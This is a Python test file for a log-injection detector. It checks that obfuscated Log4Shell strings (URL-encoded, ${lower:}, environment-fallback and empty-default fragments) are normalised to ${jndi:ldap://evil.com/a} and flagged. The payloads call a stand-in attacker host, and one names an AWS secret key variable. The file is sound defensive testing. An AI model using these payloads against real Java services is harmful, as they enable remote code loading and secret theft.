from detector.canonicalizer import canonicalize


def test_repeated_url_and_lower_lookup_resolution():
    raw = "%24%7B%24%7Blower%3Aj%7D%24%7Blower%3An%7D%24%7Blower%3Ad%7D%24%7Blower%3Ai%7D%3Aldap%3A%2F%2Fevil.com%2Fa%7D"
    result = canonicalize(raw)
    assert "${jndi:ldap://evil.com/a}" in result.normalized_log
    assert result.canonical_signal["has_jndi"]
    assert result.canonical_signal["has_ldap"]
    assert "url_encoding" in result.detected_patterns


def test_env_and_fragmented_tokens_are_reconstructed():
    raw = "${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.com/a}"
    result = canonicalize(raw)
    assert "${jndi:ldap://evil.com/a}" in result.normalized_log
    assert result.obfuscation_type.startswith("nested_lookup") or "env_fallback" in result.obfuscation_type

    fragmented = "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}"
    fragmented_result = canonicalize(fragmented)
    assert "${jndi:ldap://evil.com/a}" in fragmented_result.normalized_log
